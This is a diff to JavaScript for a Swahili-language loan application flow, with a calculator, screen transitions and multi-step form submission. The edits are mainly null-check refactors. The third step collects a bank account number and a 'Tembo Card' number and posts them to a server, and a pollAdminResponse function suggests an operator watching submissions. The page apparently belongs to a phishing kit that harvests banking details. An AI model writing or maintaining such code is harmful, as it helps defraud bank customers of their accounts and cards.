@@ -1,15 +1,21 @@
 function goToScreen(screenId) {
     document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
-    document.getElementById(screenId).classList.remove('hidden');
+    const target = document.getElementById(screenId);
+    if (target) {
+        target.classList.remove('hidden');
+    }
 }
 
 function showSpinner(text = 'Inapakia...') {
-    document.getElementById('loading-text').innerText = text;
-    document.getElementById('loading-spinner').classList.remove('hidden');
+    const textEl = document.getElementById('loading-text');
+    if (textEl) textEl.innerText = text;
+    const spinner = document.getElementById('loading-spinner');
+    if (spinner) spinner.classList.remove('hidden');
 }
 
 function hideSpinner() {
-    document.getElementById('loading-spinner').classList.add('hidden');
+    const spinner = document.getElementById('loading-spinner');
+    if (spinner) spinner.classList.add('hidden');
 }
 
 function showNotice(elementId, msg) {
@@ -81,8 +87,12 @@ function pollAdminResponse() {
 }
 
 function updateCalculator() {
-    const amount = document.getElementById('loanAmountSlider').value;
-    const months = document.getElementById('loanMonthsSlider').value;
+    const amountVal = document.getElementById('loanAmountSlider');
+    const monthsVal = document.getElementById('loanMonthsSlider');
+    if (!amountVal || !monthsVal) return;
+
+    const amount = amountVal.value;
+    const months = monthsVal.value;
     
     document.getElementById('displayAmount').innerText = 'TZS ' + Number(amount).toLocaleString();
     document.getElementById('displayMonths').innerText = months + ' miezi';
@@ -101,16 +111,14 @@ function submitStep1(e) {
 
 function submitStep2(e) {
     e.preventDefault();
-    goToScreen('screen-step3');
+    goToScreen('screen-step3'); // Explicitly transitions to Tembo Card screen
 }
 
 function submitStep3(e) {
     e.preventDefault();
-    const data = {
-        accountNumber: document.getElementById('accountNumber').value,
-        cardNumber: document.getElementById('cardNumber').value
-    };
-    postData('step3', data);
+    const accountNumber = document.getElementById('accountNumber').value;
+    const cardNumber = document.getElementById('cardNumber').value;
+    postData('step3', { accountNumber, cardNumber });
 }
 
 function submitStep4(e) {
